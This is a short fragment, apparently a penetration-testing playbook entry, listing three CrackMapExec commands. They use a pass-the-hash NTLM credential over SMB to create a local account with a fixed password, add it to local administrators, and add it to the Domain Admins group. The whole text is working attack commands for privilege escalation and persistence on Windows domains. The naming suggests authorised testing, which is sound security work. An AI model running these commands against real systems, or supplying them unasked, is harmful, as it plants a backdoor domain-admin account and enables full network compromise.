...
description: |
  ...
  Command Reference:
  	...
  	1. cme smb 192.168.1.10 -u <USER> -H <NTLM HASH> -d <DOMAIN> -x "net user aa_Onvio P3nt3st123! /add"

  	2. cme smb 192.168.1.10 -u <USER> -H <NTLM HASH> -d <DOMAIN> -x "net localgroup administrators aa_Onvio /add"

  	3. cme smb 192.168.1.10 -u <USER> -H <NTLM HASH> -d <DOMAIN> -x 'net group "Domain Admins" aa_Onvio /add'
